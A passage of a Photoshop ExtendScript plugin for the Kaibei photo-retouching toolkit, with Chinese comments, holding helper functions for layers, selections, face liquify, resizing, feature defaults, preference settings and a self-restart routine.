        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
        desc1.putReference(cTID('null'), ref1);
        desc1.putEnumerated(cTID('Usng'), cTID('ADSt'), sTID('ADSCentersV'));
        desc1.putBoolean(sTID("alignToCanvas"), false);
        app.executeAction(sTID('align'), desc1, DialogModes.NO);
      } else {//自定义对齐
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
        desc1.putReference(cTID('null'), ref1);
        desc1.putEnumerated(cTID('Usng'), cTID('ADSt'), sTID(ADSt));
        desc1.putBoolean(sTID("alignToCanvas"), false);
        app.executeAction(sTID('align'), desc1, DialogModes.NO);
      }
      return !0;
    } catch (e) { return !1 }
  },
  applyMask: function () { //应用蒙板
    try {
      this.selectLayerMask();
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putBoolean(cTID('Aply'), true);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  faceLiquefy: function (part) { //液化脸部
    try {
      var desc1 = new ActionDescriptor();
      desc1.putData(sTID("faceMeshData"), this.hexToBin(this.faceData[part]));
      app.executeAction(cTID("LqFy"), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  dotLine: function (iDirection, iPos, iOpacity) { //画虚线
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(sTID(iDirection), cTID('#Pxl'), iPos);
      desc1.putObject(cTID('T   '), cTID(iDirection == 'top' ? 'Sngr' : 'Sngc'), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      this.fillLayer([0, 0], iOpacity);
      this.deSelection();
      return !0
    } catch (e) { return !1 }
  },
  levels: function (left, right) { //调整色阶
    try {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(sTID("presetKind"), sTID("presetKindType"), sTID("presetKindCustom"));
      var list1 = new ActionList();
      var desc2 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("Chnl"), cTID("Chnl"), cTID("Cmps"));
      desc2.putReference(cTID("Chnl"), ref1);
      var list2 = new ActionList();
      list2.putInteger(left);
      list2.putInteger(right);
      desc2.putList(cTID("Inpt"), list2);
      list1.putObject(cTID("LvlA"), desc2);
      desc1.putList(cTID("Adjs"), list1);
      app.executeAction(cTID("Lvls"), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  makeAllSelect: function () {//全选
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      desc1.putEnumerated(cTID('T   '), cTID('Ordn'), cTID('Al  '));
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  makeRectSelect: function (iRect, iType, cmd) { //划矩形选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Top '), cTID('#Pxl'), iRect[1]);
      desc2.putUnitDouble(cTID('Left'), cTID('#Pxl'), iRect[0]);
      desc2.putUnitDouble(cTID('Btom'), cTID('#Pxl'), iRect[3]);
      desc2.putUnitDouble(cTID('Rght'), cTID('#Pxl'), iRect[2]);
      if (iType == 'Elps') {//圆形选区
        desc1.putObject(cTID('T   '), cTID('Elps'), desc2);
        desc1.putBoolean(cTID('AntA'), true);
      } else desc1.putObject(cTID('T   '), cTID('Rctn'), desc2);
      app.executeAction(sTID(cmd || 'set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  makeEdge: function (iLocation, iOpacity, iColor) { //图层描边
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('Wdth'), 1);
      desc1.putEnumerated(cTID('Lctn'), cTID('StrL'), sTID(iLocation || 'center'));
      desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), iOpacity || 100);
      desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('H   '), cTID('#Ang'), 0);
      desc2.putDouble(cTID('Strt'), iColor[0]);
      desc2.putDouble(cTID('Brgh'), iColor[1]);
      desc1.putObject(cTID('Clr '), cTID('HSBC'), desc2);
      app.executeAction(sTID('stroke'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  channelSelect: function (channelName) { //选择高亮区域
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID(channelName));
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  saveChannl: function (channelName, pngFile) { //保存通道为PNG
    try {
      var maskFolder = File(pngFile).parent;
      if (!maskFolder.exists) maskFolder.create();
      var desc1 = new ActionDescriptor();
      desc1.putClass(cTID('Nw  '), cTID('Dcmn'));
      var desc2 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('Chnl'), channelName);
      desc2.putReference(cTID('T   '), ref1);
      desc1.putObject(cTID('Usng'), cTID('Clcl'), desc2);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      app.activeDocument.changeMode(ChangeMode.GRAYSCALE);
      app.activeDocument.changeMode(ChangeMode.RGB);
      var options = new ExportOptionsSaveForWeb();
      options.format = SaveDocumentType.PNG;
      app.activeDocument.exportDocument(File(pngFile), ExportType.SAVEFORWEB, options);
      this.closeDoc();
      return !0;
    } catch (e) { return !1 }
  },
  getDocSize: function () { //获取文档尺寸
    try {
      var doc = app.activeDocument;
      return { width: doc.width.as("px"), height: doc.height.as("px"), resolution: doc.resolution }//
    } catch (e) { return !1 }
  },
  setDocSize: function (sideLen) { //设置文档尺寸
    //sideLen.longSide: 按长边
    //sideLen.width: 按宽度
    //sideLen.height: 按高度
    try {
      if (!sideLen) return !1;
      var tempDoc = app.activeDocument;
      var docSize = this.getDocSize();
      if (sideLen.hasOwnProperty('longSide')) {
        var Resample = Math.max(docSize.width, docSize.height) > sideLen.longSide ? ResampleMethod.BICUBICSHARPER : ResampleMethod.BICUBICSMOOTHER;
        if (docSize.height > docSize.width) tempDoc.resizeImage(null, UnitValue(sideLen.longSide, "px"), null, Resample);
        else tempDoc.resizeImage(UnitValue(sideLen.longSide, "px"), null, null, Resample);
      } else if (sideLen.hasOwnProperty('width')) {
        var Resample = docSize.width > sideLen.width ? ResampleMethod.BICUBICSHARPER : ResampleMethod.BICUBICSMOOTHER;
        tempDoc.resizeImage(UnitValue(sideLen.width, "px"), null, null, Resample);
      } else if (sideLen.hasOwnProperty('height')) {
        var Resample = docSize.height > sideLen.height ? ResampleMethod.BICUBICSHARPER : ResampleMethod.BICUBICSMOOTHER;
        tempDoc.resizeImage(null, UnitValue(sideLen.height, "px"), null, Resample);
      } else return !1;
      return !0;
    } catch (e) { return !1 }
  },
  makeGuide: function (position, orientation) { //划辅助线
    try {
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID("Pstn"), cTID("#Pxl"), position);
      desc2.putEnumerated(cTID("Ornt"), cTID("Ornt"), cTID(orientation == "v" ? "Vrtc" : "Hrzn"));
      desc1.putObject(cTID("Nw  "), cTID("Gd  "), desc2);
      app.executeAction(cTID("Mk  "), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  clearGuides: function () { //清除辅助线
    app.executeAction(sTID("clearAllGuides"), undefined, DialogModes.NO);
  },
  cropFaceDeleteLayers: function (resolution) {
    this.channelSelect('RGB');
    var faceRect = this.boundsToInt(this.getSelectionBounds());
    this.cropDoc(faceRect, false, resolution);
    this.deSelection();
    this.deleteLayer();
    var faceSize = this.getDocSize();
    this.makeGuide(0, "h");
    this.makeGuide(faceSize.height, "h");
    this.makeGuide(faceSize.width / 2 + faceSize.height / 2, "v");
    this.makeGuide(faceSize.width / 2 - faceSize.height / 2, "v");
    // this.selectLayerByName("Face Crop");
  },
  unsharpMask: function (Amnt, Rds) { //USM锐化
    try {
      var desc1 = new ActionDescriptor();
      desc1.putUnitDouble(cTID('Amnt'), cTID('#Prc'), Amnt || 21);
      desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), Rds || 2.8);
      desc1.putInteger(cTID('Thsh'), 0);
      app.executeAction(sTID('unsharpMask'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  getFunIDByName: function (funName) { //根据功能名查询功能ID
    var id;
    for (id in $.local) if (localize($.local[id]) == funName) return id
  },
  saveDefault: function (isGetOpacity) { //保存功能默认值
    try {
      if (!$._Kaibei.getLayerByName(localize($.local.repairLayer))) return !1;
      var data = {};
      var layer = app.activeDocument.layers[0];
      var funID = this.getFunIDByName(layer.name);
      if (funID == "surveyLayerSet") { //观察图层组
        var funList = ['mediumGrey', 'shadowEven'] //中性灰,光影均匀
        for (var n = 0; n < funList.length; n++) {
          var temLayer = this.getLayerByName(localize($.local[funList[n]]))
          if (!temLayer) continue;
          layer = temLayer;
          funID = funList[n];
          break;
        }
      }
      if (!isGetOpacity) { //不是仅获取不透明度时
        switch (funID) {
          case "repairLayer": //置入原片
            if (this.getLayerByName(localize($.local.insertOriginal))) funID = 'insertOriginal';
          case "skinAuto": //高低频磨皮
          case "skinFlatten": //祛除皱纹
          case "localWhiten": //局部美白
          case "skinEven": //肤色均匀
          case "bgDecontamination": //背景去污
          case "localDecontamination": //局部去污
          case "teethWhiten": //牙齿局部美白
          case "particleLight": //粒子光
          case "clothingWrinkle": //服装祛皱
          case "fillHairline": //发缝填充
          case "skinTone": //皮肤着色
          case "hairNurse": //头发柔顺
          case "hairBright": //头发光泽
          case "texturePlus": //质感增强
          case "skinCorrect": //皮肤偏色校准
          case "stretchMarks": //祛妊娠纹
          case "neckLines": //祛颈纹
          case "eyeWrinkles": //祛眼周纹
          case "foreheadWrinkles": //祛抬头纹
          case "noseWrinkles": //祛法令纹
          case "bodyskinEven": //全身肤色均匀
          case "emphasizeSubject": //突出主体
          case "neckSDRepair": //颈纹修复
          case "chinSDRepair": //双下巴修复
          case "teethSDRepair": //牙齿修复
          case "smileSDRepair": //笑容美化
          case "eyebrowSDRepair": //眉毛重绘
          case "eyelidSDRepair": //双眼皮重绘
          case "faceSDGenerate": //AI换脸
          case "hairSDGenerate": //AI植发
          case "hairSDRepair": //头发重绘
          case "fairSDBlacken": //头发染黑
          case "clothingSDRepair": //服装重绘
          case "clothingSDGenerate": //AI换装
          case "lipGloss": //智能唇彩
          case "removeStain": //服装去白点
          case "removeHeadhair": //祛头部碎发
          case "removeFacehair": //祛脸部碎发
          case "deadSkin": //新生儿祛死皮
          case "doubleChin": //祛双下巴
            data.tool = { name: "paintbrushTool", prop: { defValue: this.getCurrentToolOptions("paintbrushTool") } };
            break;
          case "localWrinkles": //局部皱纹修复
            data.tool = { name: "lassoTool", prop: { defValue: this.getCurrentToolOptions("lassoTool") } };
            break;
          case "shadowEven": //光影均匀
            data.tool = { name: "wetBrushTool", prop: { defValue: this.getCurrentToolOptions("wetBrushTool") } };
            data.shadowOpacity = this.getLayerOpacityByName(layer.name + 'shadowEven');
            break;
          case "lipStick": //唇彩
          case "creamyFoundation": //粉底
          case "hairDyeing": //头发染色
            data.tool = { name: "paintbrushTool", prop: { defValue: this.getCurrentToolOptions("paintbrushTool") } };
            data.color = this.getColorLayerByName(layer.name);
            if (!data.color) delete data.color;
            break;
          case "skinTexture": //皮肤质感
            // data.texture = this.getFilterDoubleByName(layer.name, 'radius') * 10;
            break;
          case 'dbCurves': //双曲线
            data.tool = { name: "paintbrushTool", prop: { defValue: this.getCurrentToolOptions("paintbrushTool") } };
            // var layerName = layer.name;
            // data.burn = [Math.round(this.getLegacyContentDataByName(layerName + 'burnCurve', 15)), 128 - Math.round(this.getLegacyContentDataByName(layerName + 'burnCurve', 13))];
            // data.dodge = [Math.round(this.getLegacyContentDataByName(layerName + 'dodgeCurve', 15)), Math.round(this.getLegacyContentDataByName(layerName + 'dodgeCurve', 13)) - 128];
            // data.burnOpacity = this.getLayerOpacityByName(layerName + 'burnCurve');
            // data.dodgeOpacity = this.getLayerOpacityByName(layerName + 'dodgeCurve');
            // var iLayerName = app.activeDocument.activeLayer.name;
            // data.isBurn = iLayerName == (layerName + 'burnCurve');
            // data.isDodge = iLayerName == (layerName + 'dodgeCurve');
            break;
          case 'mediumGrey': //中性灰
            data.tool = { name: "paintbrushTool", prop: { defValue: this.getCurrentToolOptions("paintbrushTool") } };
            data.isBurn = app.foregroundColor.rgb.hexValue == '000000';
            data.isDodge = app.foregroundColor.rgb.hexValue == 'FFFFFF';
            break;
          case "slimBody": //AI瘦身美型
          case "lengthenLeg": //拉长腿
          // var layerBounds = this.boundsToInt(layer.bounds);
          // var repairLayer = this.getLayerByName(localize($.local.repairLayer));
          // var repairLayerBounds = this.boundsToInt(repairLayer.bounds);
          // var scaleNum = repairLayerBounds[2] > repairLayerBounds[3] ? 1 : repairLayerBounds[2] / repairLayerBounds[3];
          // data.prcLength = (layerBounds[3] / repairLayerBounds[3] - 1) / scaleNum + 1;
          // break;
          case 'copyColor': //AI仿色
          case 'autoColor': //AI校色
          case 'toneEffect': //艺术色调
            var meta = this.getLayerMetadata(layer);
            if (typeof meta === 'object') data = assign(data, meta);
            if (funID == 'toneEffect') {
              var doc = app.activeDocument;
              data.area = doc.width.as('px') * doc.height.as('px');
            }
            break;
        }
      }
      if (funID && funID != 'repairLayer' && funID != 'skyGroup') {
        data.opacity = Math.round(layer.opacity);
        if (funID == 'maskOpacity') data.maskOpacity = Math.round(layer.layerMaskDensity); //获取蒙板密度
        else if (isGetOpacity) { //仅获取不透明度时
          if (funID == 'cameraRaw') { //获取cameraRaw功能中智能对象的ACR值
            try {
              var ref1 = new ActionReference();
              ref1.putName(cTID('Lyr '), layer.name);
              var desc1 = app.executeActionGet(ref1);
              var desc = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(0).getObjectValue(cTID("Fltr"));
              data.data = this.desc2json(desc)
            } catch (e) { }
          } else if (funID == 'copyColor' || funID == 'toneEffect' || funID == 'autoColor' || funID == 'lengthenLeg' || funID == 'slimBody') { //获取功能图层meta中的参数值
            var meta = this.getLayerMetadata(layer);
            if (typeof meta === 'object') data = assign(data, meta);
            // this.sendEvent({ type: 'AI仿色功能参数值：', data: data });
          }
        }
        return JSON.stringify({ funID: funID, data: data });
        // this.sendEvent({type:'saveDefault', data:{funID:funID, data:data}});
      }
    } catch (e) { }
    return !1;
  },
  shrinkRectangle: function (rectangle, pixels) { //扩大或缩小矩形
    rectangle[0] -= pixels;   // 左边界加上指定像素
    rectangle[1] -= pixels;   // 上边界加上指定像素
    rectangle[2] += pixels;   // 右边界减去指定像素
    rectangle[3] += pixels;   // 下边界减去指定像素
    return rectangle;
  },
  getHomeScreenVisible: function () { //获取当前主屏幕是否打开
    try {
      var ref = new ActionReference();
      ref.putProperty(sTID("property"), sTID("homeScreenVisibility"));
      ref.putEnumerated(sTID("application"), sTID("ordinal"), sTID("targetEnum"));
      return app.executeActionGet(ref).getBoolean(sTID("homeScreenVisibility"));
    } catch (e) { return !1 }
  },
  getCachePrefs: function () { //获取内存比例
    try {
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('capp'), sTID('Ordinal'), sTID('Target'));
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getObjectValue(cTID('CchP'));
      return desc2.getUnitDoubleValue(cTID('MmrU'));
    } catch (e) { return !1 }
  },
  getPlaceRasterSmartObject: function () { //获取置入时是对象
    try {
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('capp'), sTID('Ordinal'), sTID('Target'));
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getObjectValue(cTID('GnrP'));
      return desc2.getBoolean(sTID('placeRasterSmartObject'));
    } catch (e) { return !1 }
  },
  setPlaceRasterSmartObject: function (isFlag) { //设置置入时是对象
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(sTID('property'), cTID('GnrP'));
      ref1.putEnumerated(cTID('capp'), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(sTID('placeRasterSmartObject'), isFlag);
      desc1.putObject(sTID('to'), cTID('GnrP'), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  getScratchDisks: function () { //获取暂存盘
    try {
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('capp'), sTID('Ordinal'), sTID('Target'));
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getObjectValue(sTID('scratchDiskPreferences'));
      var list = desc2.getList(cTID('ScrD'));
      var diskList = [];
      for (var i = 0; i < list.count; i++)diskList.push(list.getString(i));
      return diskList;
    } catch (e) { return [] }
  },
  setScratchDisks: function (diskList) { //设置暂存盘
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(sTID('property'), sTID('cachePrefs'));
      ref1.putEnumerated(cTID('capp'), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      var list1 = new ActionList();
      for (var i = 0; i < diskList.count; i++) list1.push(diskList[i]);
      desc2.putList(sTID('scratchDisks'), list1);
      //desc2.putUnitDouble(sTID('memoryUsagePercent'),sTID('percentUnit'),55);
      desc1.putObject(sTID('to'), sTID('cachePrefs'), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
    } catch (e) { }
  },
  singleLine: function (leftOrTop, pix, opacity) { //画单线
    // alert(leftOrTop +' | '+parseInt(pix))
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Chnl'), sTID("selection"));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putUnitDouble(sTID(leftOrTop), cTID('#Pxl'), pix);
    desc1.putObject(cTID('T   '), cTID(leftOrTop == 'top' ? 'Sngr' : 'Sngc'), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Gry '));
    desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), opacity || 50);
    desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
    app.executeAction(sTID('fill'), desc1, DialogModes.NO);
    this.deSelection();
  },
  drawLine: function () { //画线
    try {
      var _this = this;
      _btn = function () {
        var doc = app.activeDocument;
        doc.flatten();
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('null'), ref1);
        var desc2 = new ActionDescriptor();
        if (Math.ceil(Math.random() * 2) > 1) { //竖
          var docWidth = doc.width.as('px');
          var val = Math.ceil(docWidth * 0.1 + Math.random() * docWidth * 0.8);
          desc2.putUnitDouble(cTID('Left'), cTID('#Pxl'), val);
          desc1.putObject(cTID('T   '), cTID('Sngc'), desc2);
        } else { //横
          var docHeight = doc.height.as('px');
          var val = Math.ceil(docHeight * 0.1 + Math.random() * docHeight * 0.8);
          desc2.putUnitDouble(cTID('Top '), cTID('#Pxl'), val);
          desc1.putObject(cTID('T   '), cTID('Sngr'), desc2);
        }
        app.executeAction(sTID('set'), desc1, DialogModes.NO);
        var desc1 = new ActionDescriptor();
        desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
        desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 50);
        desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
        app.executeAction(sTID('fill'), desc1, DialogModes.NO);
        _this.deSelection();
      }
      this.suspendHistory('', '_btn()');
      _this.toBaseLayer();
      _this.psPurge('history');
      return !0;
    } catch (e) { return !1 }
  },
  getDepth: function () { //获取位图模式
    try {
      switch (app.activeDocument.bitsPerChannel) {
        case BitsPerChannelType.THIRTYTWO: return 32;
        case BitsPerChannelType.SIXTEEN: return 16;
        case BitsPerChannelType.EIGHT: return 8;
      }
    } catch (e) { }
    return !1;
  },
  convertDepth: function (bit) { //转换位图模式
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('Dpth'), bit);
      desc1.putBoolean(cTID('Mrge'), false);
      app.executeAction(sTID('convertMode'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  closePS: function () { //关闭PS
    while (true) { if (!this.closeDoc()) break }
    try { app.executeAction(cTID('quit'), undefined, DialogModes.ALL) } catch (e) { photoshop.quit() }
  },
  saveToneEffectJpg: function () { //保存艺术色调原图
    try {
      if (app.documents.length == 0) return !1;
      this.setLayerVisibleByName(localize($.local.toneEffect), !1);
      var ret = {};
      ret.thumbnail = this.saveWebJpg();
      ret.original = this.saveJPG(this.tempFolder + 'temp_000.jpg');
      this.setLayerVisibleByName(localize($.local.toneEffect), !0);
      if (File(ret.thumbnail).exists && File(ret.original).exists) return JSON.stringify(ret);
      else return !1;
    } catch (e) { return !1 }
  },
  restart: function (scr) { //重启Ps
    try {
      while (true) { if (!this.closeDoc()) break }
      var r = new ActionReference();
      r.putProperty(cTID("Prpr"), sTID("path"));
      r.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var pth = app.executeActionGet(r).getPath(sTID("path"));

      var file = new File(Folder.temp.fsName + "\\" + "tmp.js");
      file.encoding = "UNICODE-1-1-UTF-8";
      file.open("w");

      file.writeln("var WshShell = WScript.CreateObject(\"WScript.Shell\")");
      file.writeln("while (WshShell.AppActivate(\"Adobe Photoshop\")) WScript.Sleep (1000)");
      file.writeln("WScript.Sleep (1000)");
      if (scr) {
        file.writeln("var p=" + pth.fsName.toSource());
        file.writeln("var s=" + scr.toSource());
        file.writeln("WshShell.Run(\"\\\"\"+p+\"\\\"\" + \" \\\"\"+s+\"\\\"\")")
      } else {
        file.writeln("var p=" + pth.fsName.toSource());
        file.writeln("WshShell.Run(\"\\\"\"+p+\"\\\"\")")
      }
      file.close();
      file.execute();

      try { app.executeAction(cTID('quit'), undefined, DialogModes.ALL) } catch (e) { photoshop.quit() }
    } catch (e) { }
  },
  hasNonEnglishCharacter: function (path) { //检测有没有非英文字符
    return /[^ -~]/.test(path);
  },
};

try {
  slashPath = function (str) { return str.replace(/\\/g, '/') } //反斜杠转正斜杠
  assign = function (o, n) { for (var p in n) o[p] = n[p]; return o } //连接对象函数
  if (typeof JSON !== "object") { JSON = {} } (function () { var rx_one = /^[\],:{}\s]*$/; var rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g; var rx_three = /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g; var rx_four = /(?:^|:|,)(?:\s*\[)+/g; var rx_escapable = /[\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g; var rx_dangerous = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g; function f(n) { return (n < 10) ? "0" + n : n } function this_value() { return this.valueOf() } if (typeof Date.prototype.toJSON !== "function") { Date.prototype.toJSON = function () { return isFinite(this.valueOf()) ? (this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z") : null }; Boolean.prototype.toJSON = this_value; Number.prototype.toJSON = this_value; String.prototype.toJSON = this_value } var gap; var indent; var meta; var rep; function quote(string) { rx_escapable.lastIndex = 0; return rx_escapable.test(string) ? '"' + string.replace(rx_escapable, function (a) { var c = meta[a]; return typeof c === "string" ? c : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4) }) + '"' : '"' + string + '"' } function str(key, holder) { var i; var k; var v; var length; var mind = gap; var partial; var value = holder[key]; if (value && typeof value === "object" && typeof value.toJSON === "function") { value = value.toJSON(key) } if (typeof rep === "function") { value = rep.call(holder, key, value) } switch (typeof value) { case "string": return quote(value); case "number": return (isFinite(value)) ? String(value) : "null"; case "boolean": case "null": return String(value); case "object": if (!value) { return "null" } gap += indent; partial = []; if (Object.prototype.toString.apply(value) === "[object Array]") { length = value.length; for (i = 0; i < length; i += 1) { partial[i] = str(i, value) || "null" } v = partial.length === 0 ? "[]" : gap ? ("[\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "]") : "[" + partial.join(",") + "]"; gap = mind; return v } if (rep && typeof rep === "object") { length = rep.length; for (i = 0; i < length; i += 1) { if (typeof rep[i] === "string") { k = rep[i]; v = str(k, value); if (v) { partial.push(quote(k) + ((gap) ? ": " : ":") + v) } } } } else { for (k in value) { if (Object.prototype.hasOwnProperty.call(value, k)) { v = str(k, value); if (v) { partial.push(quote(k) + ((gap) ? ": " : ":") + v) } } } } v = partial.length === 0 ? "{}" : gap ? "{\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "}" : "{" + partial.join(",") + "}"; gap = mind; return v } } if (typeof JSON.stringify !== "function") { meta = { "\b": "\\b", "\t": "\\t", "\n": "\\n", "\f": "\\f", "\r": "\\r", '"': '\\"', "\\": "\\\\" }; JSON.stringify = function (value, replacer, space) { var i; gap = ""; indent = ""; if (typeof space === "number") { for (i = 0; i < space; i += 1) { indent += " " } } else { if (typeof space === "string") { indent = space } } rep = replacer; if (replacer && typeof replacer !== "function" && (typeof replacer !== "object" || typeof replacer.length !== "number")) { throw new Error("JSON.stringify") } return str("", { "": value }) } } if (typeof JSON.parse !== "function") { JSON.parse = function (text, reviver) { var j; function walk(holder, key) { var k; var v; var value = holder[key]; if (value && typeof value === "object") { for (k in value) { if (Object.prototype.hasOwnProperty.call(value, k)) { v = walk(value, k); if (v !== undefined) { value[k] = v } else { delete value[k] } } } } return reviver.call(holder, key, value) } text = String(text); rx_dangerous.lastIndex = 0; if (rx_dangerous.test(text)) { text = text.replace(rx_dangerous, function (a) { return ("\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4)) }) } if (rx_one.test(text.replace(rx_two, "@").replace(rx_three, "]").replace(rx_four, ""))) { j = eval("(" + text + ")"); return (typeof reviver === "function") ? walk({ "": j }, "") : j } throw new SyntaxError("JSON.parse") } } }());
  if (app.preferences.rulerUnits == Units.PERCENT) app.preferences.rulerUnits = Units.PIXELS;
  $._Kaibei.faceData = JSON.parse($._Kaibei.readFile($._Kaibei.jsxFolder + 'data.json'));
  $.evalFile($._Kaibei.jsxFolder + './libs/md5.js');
  $.evalFile($._Kaibei.jsxFolder + './libs/stdlib.js');
  $.evalFile($._Kaibei.jsxFolder + 'Retouch.jsx');
 
  var tempFolder = Folder($._Kaibei.tempFolder);
  if (!tempFolder.exists) tempFolder.create();
  else {//启动PS时清空临时文件夹
    var tmpFiles = tempFolder.getFiles();
    for (var i = 0; i < tmpFiles.length; i++)tmpFiles[i].remove();
  }
  File(Folder.userData.fsName + '/Kaibei/Xiutu/PT/Preferences.xml').copy(Folder.userData.fsName + '/skinImage/PT/2.0/Settings/Preferences.xml');
  File(Folder.userData.fsName + '/Kaibei/Xiutu/NW/Preferences.xml').copy(Folder.userData.fsName + '/skinImage/NW/5.0/Preferences.xml');
  // $._Kaibei.restart();
  //首次启动时选择工作区
  var psVersion = Number(app.version.slice(0, 2));
  var psVerFile = File(Folder.userData.fsName + '/Kaibei/Xiutu/PS20' + (psVersion - 1));
  if (psVerFile.exists) {
    var psSetPath = (psVersion == 20 ? Folder.userData.fsName + "/Adobe/Adobe Photoshop CC 2019/Adobe Photoshop CC 2019 Settings/" :
      Folder.userData.fsName + "/Adobe/Adobe Photoshop 20" + (psVersion - 1) + "/Adobe Photoshop 20" + (psVersion - 1) + " Settings/")
    var pswFile = File(psSetPath + "WorkSpaces/开贝修图Max.psw");
    if (!pswFile.exists) File(Folder.userData.fsName + "/Kaibei/Xiutu/开贝修图Max.psw").copy(pswFile);
    if ($._Kaibei.getCustomOptions('mainClose')) psVerFile.remove();
    else if ($._Kaibei.selWorkspace('开贝修图Max')) psVerFile.remove();
    else if ($._Kaibei.resetWorkspace('开贝修图Max')) psVerFile.remove();
    $._Kaibei.sendEvent({ type: 'openMain', data: {} });
  }
  //检测PS内存配比
  var CachePrefs = $._Kaibei.getCachePrefs();
  if (CachePrefs != false && (CachePrefs < 50 || CachePrefs > 85)) {
    if (confirm('检测到当前PS中的内存使用比例设置不合适，建议设置在70~85%之间。\n\n是否现在去更改设置？ （提示：设置后重启PS生效）') == true) {
      try {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), cTID('MmrP'));
